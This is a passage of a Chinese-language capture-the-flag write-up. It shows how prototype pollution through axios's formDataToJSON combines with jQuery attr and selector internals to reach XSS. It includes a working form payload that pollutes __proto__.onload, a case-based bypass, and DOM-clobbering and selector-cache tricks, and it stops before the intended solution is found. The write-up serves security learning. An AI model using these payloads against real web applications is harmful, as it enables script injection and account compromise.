+    formData<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">'__proto__.x'</span><span class="token punctuation">,</span> <span class="token string">'hack'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    formData<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">'constructor.prototype.y'</span><span class="token punctuation">,</span> <span class="token string">'value'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token function">expect</span><span class="token punctuation">(</span><span class="token function">formDataToJSON</span><span class="token punctuation">(</span>formData<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toEqual</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
+      <span class="token literal-property property">foo</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">'1'</span><span class="token punctuation">,</span> <span class="token string">'2'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
+      <span class="token literal-property property">constructor</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
+        <span class="token literal-property property">prototype</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
+          <span class="token literal-property property">y</span><span class="token operator">:</span> <span class="token string">'value'</span>
+        <span class="token punctuation">&#125;</span>
+      <span class="token punctuation">&#125;</span>
+    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token function">expect</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">.</span>x<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toEqual</span><span class="token punctuation">(</span><span class="token keyword">undefined</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">expect</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">.</span>y<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toEqual</span><span class="token punctuation">(</span><span class="token keyword">undefined</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>從 commit 可以看出 axios 中有一個叫做 <code>formDataToJSON</code> 的函式，會把 FormData 轉為 JSON，而轉換的程式碼中存有漏洞，可以透過 name 進行 prototype pollution。</p>
+<p>接著再回來看題目的程式碼，有一段是：<code>axios.post(&quot;/search&quot;, $(&quot;#search&quot;).get(0)</code>，因此只要能掌握 <code>#search</code>，就能掌握這邊傳入的參數，從 axios 的原始碼中可以看出這邊傳入的 form，最後會被取出 FormData，並且傳給 <code>formDataToJSON</code>（這邊引用的部分程式碼看不出來，但只要 trace 一下之後不難發現這件事）。</p>
+<p>因此，我們可以用 name 注入一個 <code>&lt;form&gt;</code> 來進行 prototype pollution，下一步就要尋找 gadget 了，通常在找 gadget 的時候，會先從物件下手。</p>
+<p>而程式碼中有個部分非常可疑：</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"#homepage"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">attr</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
+    <span class="token string-property property">"src"</span><span class="token operator">:</span> repo<span class="token punctuation">.</span>homepage<span class="token punctuation">,</span>
+    <span class="token string-property property">"hidden"</span><span class="token operator">:</span> <span class="token boolean">false</span>
+<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>這裡傳入的參數是個物件，如果 <code>.attr</code> 函式沒有特別做檢查，很有可能會被污染的參數影響，而事實上也是這樣，在 jQuery 中，<a target="_blank" rel="noopener" href="https://github.com/jquery/jquery/blob/3.7.1/src/attributes/attr.js#L16">attr 的實作如下</a>：</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">jQuery<span class="token punctuation">.</span>fn<span class="token punctuation">.</span><span class="token function">extend</span><span class="token punctuation">(</span> <span class="token punctuation">&#123;</span>
+    <span class="token function-variable function">attr</span><span class="token operator">:</span> <span class="token keyword">function</span><span class="token punctuation">(</span> <span class="token parameter">name<span class="token punctuation">,</span> value</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">return</span> <span class="token function">access</span><span class="token punctuation">(</span> <span class="token keyword">this</span><span class="token punctuation">,</span> jQuery<span class="token punctuation">.</span>attr<span class="token punctuation">,</span> name<span class="token punctuation">,</span> value<span class="token punctuation">,</span> arguments<span class="token punctuation">.</span>length <span class="token operator">></span> <span class="token number">1</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><a target="_blank" rel="noopener" href="https://github.com/jquery/jquery/blob/main/src/core/access.js#L12">access 的部分實作</a>：</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">export</span> <span class="token keyword">function</span> <span class="token function">access</span><span class="token punctuation">(</span> <span class="token parameter">elems<span class="token punctuation">,</span> fn<span class="token punctuation">,</span> key<span class="token punctuation">,</span> value<span class="token punctuation">,</span> chainable<span class="token punctuation">,</span> emptyGet<span class="token punctuation">,</span> raw</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span>
+        len <span class="token operator">=</span> elems<span class="token punctuation">.</span>length<span class="token punctuation">,</span>
+        bulk <span class="token operator">=</span> key <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
+
+    <span class="token comment">// Sets many values</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">toType</span><span class="token punctuation">(</span> key <span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token string">"object"</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        chainable <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
+        <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token keyword">in</span> key <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+            <span class="token function">access</span><span class="token punctuation">(</span> elems<span class="token punctuation">,</span> fn<span class="token punctuation">,</span> i<span class="token punctuation">,</span> key<span class="token punctuation">[</span> i <span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">,</span> emptyGet<span class="token punctuation">,</span> raw <span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>如果傳入的 key 是個 object，會用 in 來取出每一個 key 設定。由於 in 會取出原型鏈上的屬性，因此可以透過污染 <code>onload</code>，讓 jQuery 去設定 onload 屬性。</p>
+<p>payload 如下：</p>
+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>search</span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>__proto__.onload</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>alert(document.domain)</span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>q</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>react-d3</span><span class="token punctuation">></span></span>&lt;
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>看起來沒什麼問題，但嘗試過後，會發現出現了錯誤：</p>
+<pre class="line-numbers language-none"><code class="language-none">Uncaught (in promise) TypeError: Cannot use &#39;in&#39; operator to search for &#39;set&#39; in alert(document.domain)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>經過一陣 debug 之後，會發現這段錯誤是源自於設置 attr 時的這一段：</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// Attribute hooks are determined by the lowercase version</span>
+<span class="token comment">// Grab necessary hook if one is defined</span>
+<span class="token keyword">if</span> <span class="token punctuation">(</span> nType <span class="token operator">!==</span> <span class="token number">1</span> <span class="token operator">||</span> <span class="token operator">!</span>jQuery<span class="token punctuation">.</span><span class="token function">isXMLDoc</span><span class="token punctuation">(</span> elem <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    hooks <span class="token operator">=</span> jQuery<span class="token punctuation">.</span>attrHooks<span class="token punctuation">[</span> name<span class="token punctuation">.</span><span class="token function">toLowerCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">]</span> <span class="token operator">||</span>
+        <span class="token punctuation">(</span> jQuery<span class="token punctuation">.</span>expr<span class="token punctuation">.</span>match<span class="token punctuation">.</span>bool<span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span> name <span class="token punctuation">)</span> <span class="token operator">?</span> boolHook <span class="token operator">:</span> <span class="token keyword">undefined</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">if</span> <span class="token punctuation">(</span> value <span class="token operator">!==</span> <span class="token keyword">undefined</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span> value <span class="token operator">===</span> <span class="token keyword">null</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        jQuery<span class="token punctuation">.</span><span class="token function">removeAttr</span><span class="token punctuation">(</span> elem<span class="token punctuation">,</span> name <span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">return</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token keyword">if</span> <span class="token punctuation">(</span> hooks <span class="token operator">&amp;&amp;</span> <span class="token string">"set"</span> <span class="token keyword">in</span> hooks <span class="token operator">&amp;&amp;</span>
+        <span class="token punctuation">(</span> ret <span class="token operator">=</span> hooks<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span> elem<span class="token punctuation">,</span> value<span class="token punctuation">,</span> name <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token keyword">undefined</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">return</span> ret<span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+
+    elem<span class="token punctuation">.</span><span class="token function">setAttribute</span><span class="token punctuation">(</span> name<span class="token punctuation">,</span> value <span class="token operator">+</span> <span class="token string">""</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">return</span> value<span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>會先執行到 <code>hooks = jQuery.attrHooks[ name.toLowerCase() ]</code>，由於我們污染了 <code>onload</code> 屬性，所以 <code>jQuery.attrHooks[&#39;onload&#39;]</code> 會是字串，因此 hooks 也是個字串。</p>
+<p>接著執行到 <code>&quot;set&quot; in hooks</code>，由於字串並沒有 <code>in</code> 可以用，因此拋出了先前看到的錯誤。</p>
+<p>既然知道問題在哪了，那解決方式就簡單了，把 <code>onload</code> 改成 <code>Onload</code> 就好，因為如此一來 <code>name.toLowerCase()</code> 就會是 <code>onload</code>，而 <code>jQuery.attrHooks[&#39;onload&#39;]</code> 並不存在。</p>
+<p>做到這裡，題目就解開了，難度比我想像中的容易很多，大約花個 3-4 個小時差不多。接著，我看到了作者的<a target="_blank" rel="noopener" href="https://twitter.com/kevin_mizu/status/1744552795410456756">推特</a>，意識到原來是有 unintended，難怪難度比我想得要低。</p>
+<h2><span id="預期解法也沒這麼難嗎">預期解法也沒這麼難…嗎？</span></h2><p>知道自己的解法是非預期之後，就開始思考起什麼才是預期解，作者有在 Discord 裡面說預期解法跟現在的非預期解法，使用到的地方完全不同，因此可以想像是把 <code>attr(&#123;&#125;)</code> 那一段排除，留下剩下的程式碼，就只剩這些：</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">search</span><span class="token punctuation">(</span><span class="token parameter">name</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"img.loading"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">attr</span><span class="token punctuation">(</span><span class="token string">"hidden"</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    axios<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">"/search"</span><span class="token punctuation">,</span> <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"#search"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>
+        <span class="token string-property property">"headers"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span> <span class="token string-property property">"Content-Type"</span><span class="token operator">:</span> <span class="token string">"application/json"</span> <span class="token punctuation">&#125;</span>
+    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">d</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
+        <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"img.loading"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">attr</span><span class="token punctuation">(</span><span class="token string">"hidden"</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">const</span> repo <span class="token operator">=</span> d<span class="token punctuation">.</span>data<span class="token punctuation">;</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>repo<span class="token punctuation">.</span>owner<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+            <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"Not found!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token keyword">return</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
+
+        <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"img.avatar"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">attr</span><span class="token punctuation">(</span><span class="token string">"src"</span><span class="token punctuation">,</span> repo<span class="token punctuation">.</span>owner<span class="token punctuation">.</span>avatar_url<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"#description"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">text</span><span class="token punctuation">(</span>repo<span class="token punctuation">.</span>description<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>剩下的程式碼中，我的直覺告訴我重點是這一行：</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"img.avatar"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">attr</span><span class="token punctuation">(</span><span class="token string">"src"</span><span class="token punctuation">,</span> repo<span class="token punctuation">.</span>owner<span class="token punctuation">.</span>avatar_url<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>如果可以利用 prototype pollution 把 <code>$(&quot;img.avatar&quot;)</code> 變成 <code>$(&#39;#homepage&#39;)</code>，選到那個 iframe 的話，再搭配上我們可以掌握 <code>repo.owner.avatar_url</code>，就能把 iframe 的 src 設置成 <code>javascript:alert(1)</code>，達成 XSS。</p>
+<p>我覺得這個猜測非常合理，大概有九成的把握是對的，因為透過 prototype pollution 來影響 selector 這個招數應該是新的，至少我之前沒看過，而且這個很酷！也符合了作者在推特上講的：「super interesting」</p>
+<p>因此，接下來我就花了點時間開始尋找 selector 是怎麼運作的，但這段程式碼比我想像中複雜了不少，而且牽涉到許多函式。</p>
+<p>花了四五個小時之後，終於找到一個可以利用的地方。</p>
+<p>首先，在執行 <code>$()</code> 的時候，底層是用 <a target="_blank" rel="noopener" href="https://github.com/jquery/jquery/blob/3.7.1/src/selector.js#L197">find</a> 來找到對應的元素，而這邊會有一個 <code>documentIsHTML</code> 的檢查，如果是 true 的話，基本上就會就是利用 querySelector 之類的原生 API 去尋找，沒有操作空間。</p>
+<p>因此我們要先想辦法讓它是 false，判斷的程式碼在<a target="_blank" rel="noopener" href="https://github.com/jquery/jquery/blob/3.7.1/src/core.js#L330">這裡</a>，只要讓 <code>isXMLDoc</code> 回傳 true，<code>documentIsHTML</code> 就會是 false：</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token function-variable function">isXMLDoc</span><span class="token operator">:</span> <span class="token keyword">function</span><span class="token punctuation">(</span> <span class="token parameter">elem</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">var</span> namespace <span class="token operator">=</span> elem <span class="token operator">&amp;&amp;</span> elem<span class="token punctuation">.</span>namespaceURI<span class="token punctuation">,</span>
+        docElem <span class="token operator">=</span> elem <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span> elem<span class="token punctuation">.</span>ownerDocument <span class="token operator">||</span> elem <span class="token punctuation">)</span><span class="token punctuation">.</span>documentElement<span class="token punctuation">;</span>
+
+    <span class="token comment">// Assume HTML when documentElement doesn't yet exist, such as inside</span>
+    <span class="token comment">// document fragments.</span>
+    <span class="token keyword">return</span> <span class="token operator">!</span>rhtmlSuffix<span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span> namespace <span class="token operator">||</span> docElem <span class="token operator">&amp;&amp;</span> docElem<span class="token punctuation">.</span>nodeName <span class="token operator">||</span> <span class="token string">"HTML"</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>我們可以透過 DOM clobbering 去覆蓋掉 <code>documentElement</code>，來讓 <code>docElem</code> 變成一個 <code>&lt;img&gt;</code>，因為不是 <code>&lt;html&gt;</code>，就可以讓檢查失效，並且讓 <code>isXMLDoc</code> 變成 true。</p>
+<p>繞過了檢查以後，就暫時不會用原生的那些 API，而是執行到 <a target="_blank" rel="noopener" href="https://github.com/jquery/jquery/blob/3.7.1/src/selector.js#L2001">select</a> 函式，開頭會先將 selector 做 <a target="_blank" rel="noopener" href="https://github.com/jquery/jquery/blob/3.7.1/src/selector.js#L1479">tokenize</a>：</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">tokenize</span><span class="token punctuation">(</span> <span class="token parameter">selector<span class="token punctuation">,</span> parseOnly</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">var</span> matched<span class="token punctuation">,</span> match<span class="token punctuation">,</span> tokens<span class="token punctuation">,</span> type<span class="token punctuation">,</span>
+        soFar<span class="token punctuation">,</span> groups<span class="token punctuation">,</span> preFilters<span class="token punctuation">,</span>
+        cached <span class="token operator">=</span> tokenCache<span class="token punctuation">[</span> selector <span class="token operator">+</span> <span class="token string">" "</span> <span class="token punctuation">]</span><span class="token punctuation">;</span>
+
+    <span class="token keyword">if</span> <span class="token punctuation">(</span> cached <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">return</span> parseOnly <span class="token operator">?</span> <span class="token number">0</span> <span class="token operator">:</span> cached<span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span> <span class="token number">0</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token comment">// ...</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>這邊看起來就是我們要找的地方了！</p>
+<p>只要污染 <code>img.avatar </code>，就可以控制 <code>tokenCache</code> 的內容，進而影響到 tokenize 的結果，直接把結果替代成我們要選的 iframe。</p>
+<p>看來預期解法也沒這麼難嘛。</p>
+<p>但嘗試過後，發現沒有用。</p>
+<p>沒有用的原因不是因為 gadget 找錯，而是因為 prototype pollution 的部分。此時，就被逼得回頭研究之前偷懶只看 exploit 的 axios 漏洞。</p>
+<p>Axios 在把 form 的名稱轉成 JSON 的 key 時，是這樣<a target="_blank" rel="noopener" href="https://github.com/axios/axios/blob/v1.6.4/lib/helpers/formDataToJSON.js#L12">運作</a>的：</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">/**
+ * It takes a string like `foo[x][y][z]` and returns an array like `['foo', 'x', 'y', 'z']
+ *
+ * @param &#123;string&#125; name - The name of the property to get.
+ *
+ * @returns An array of strings.
+ */</span>
+<span class="token keyword">function</span> <span class="token function">parsePropPath</span><span class="token punctuation">(</span><span class="token parameter">name</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+  <span class="token comment">// foo[x][y][z]</span>
+  <span class="token comment">// foo.x.y.z</span>
+  <span class="token comment">// foo-x-y-z</span>
+  <span class="token comment">// foo x y z</span>
+  <span class="token keyword">return</span> utils<span class="token punctuation">.</span><span class="token function">matchAll</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">\w+|\[(\w*)]</span><span class="token regex-delimiter">/</span><span class="token regex-flags">g</span></span><span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token parameter">match</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">return</span> match<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string">'[]'</span> <span class="token operator">?</span> <span class="token string">''</span> <span class="token operator">:</span> match<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">||</span> match<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>會把 A-Za-z0-9_ 以外的字元都當作分隔符號，因此空白沒辦法成為屬性名稱的一部分。我在這邊花了三四個小時，沒有找到任何可以繞過的方式。</p>
+<p>此時我知道我錯了，這題真的沒這麼簡單…</p>
+<h2><span id="人生三大錯覺之一我能解開">人生三大錯覺之一：我能解開</span></h2><p>過了一天以後，繼續看這道題目，既然沒辦法用空白，那應該是有其他地方可以利用，於是就接著追蹤程式碼的運作。</p>
+<p>繼續一直往下追的話，會追到 <a target="_blank" rel="noopener" href="https://github.com/jquery/jquery/blob/3.7.1/src/selector.js#L1766">matcherFromTokens</a> 這個函式，但裡面的程式碼一樣又多又複雜，於是我第一次看到的時候心裡想著：「算了吧，還是等解答好了」。</p>
+<p>但過了一天之後重振精神，再次從頭開始看起，發現其實在進入 tokenize 之前，就有一個地方可以污染了：</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">select</span><span class="token punctuation">(</span> <span class="token parameter">selector<span class="token punctuation">,</span> context<span class="token punctuation">,</span> results<span class="token punctuation">,</span> seed</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+  <span class="token keyword">var</span> i<span class="token punctuation">,</span> tokens<span class="token punctuation">,</span> token<span class="token punctuation">,</span> type<span class="token punctuation">,</span> find<span class="token punctuation">,</span>
+    compiled <span class="token operator">=</span> <span class="token keyword">typeof</span> selector <span class="token operator">===</span> <span class="token string">"function"</span> <span class="token operator">&amp;&amp;</span> selector<span class="token punctuation">,</span>
+    match <span class="token operator">=</span> <span class="token operator">!</span>seed <span class="token operator">&amp;&amp;</span> <span class="token function">tokenize</span><span class="token punctuation">(</span> <span class="token punctuation">(</span> selector <span class="token operator">=</span> compiled<span class="token punctuation">.</span>selector <span class="token operator">||</span> selector <span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token comment">// ...</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>這邊有個 <code>selector = compiled.selector || selector</code>，那只要污染 <code>selector</code>，我不就可以任意更改 selector 了嗎？</p>
+<p>正當我為自己的聰明沾沾自喜時，現實馬上跑過來打了我一巴掌，污染了 selector 之後，在進入到 tokenize 時出錯了，因為裡面有一段是：</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// Filters</span>
+<span class="token keyword">for</span> <span class="token punctuation">(</span> type <span class="token keyword">in</span> filterMatchExpr <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span> match <span class="token operator">=</span> jQuery<span class="token punctuation">.</span>expr<span class="token punctuation">.</span>match<span class="token punctuation">[</span> type <span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span> soFar <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span> <span class="token operator">!</span>preFilters<span class="token punctuation">[</span> type <span class="token punctuation">]</span> <span class="token operator">||</span>
+        <span class="token punctuation">(</span> match <span class="token operator">=</span> preFilters<span class="token punctuation">[</span> type <span class="token punctuation">]</span><span class="token punctuation">(</span> match <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        matched <span class="token operator">=</span> match<span class="token punctuation">.</span><span class="token function">shift</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        tokens<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span> <span class="token punctuation">&#123;</span>
+            <span class="token literal-property property">value</span><span class="token operator">:</span> matched<span class="token punctuation">,</span>
+            <span class="token literal-property property">type</span><span class="token operator">:</span> type<span class="token punctuation">,</span>
+            <span class="token literal-property property">matches</span><span class="token operator">:</span> match
+        <span class="token punctuation">&#125;</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
+        soFar <span class="token operator">=</span> soFar<span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span> matched<span class="token punctuation">.</span>length <span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>因為污染了 selector，所以在執行 <code>type in filterMatchExpr</code> 的時候，被污染的 selector 就會被取出來，接著執行到 <code>jQuery.expr.match[ type ].exec</code>，由於字串並沒有 exec 這個方法，所以就會報錯。</p>
+<p>也就是說，不管我們污染了什麼，只要進入到 tokenize 就會出錯，所以想要把 selector 直接污染成 iframe 是辦不到的。</p>
+<p>但沒關係，我們可以把 selector 污染成之前已經在 cache 裡面的東西，例如說 <code>img.loading</code>，就可以繞過 tokenize。</p>
+<p>但這也只是不讓程式壞掉而已，依舊沒辦法把題目解開。</p>
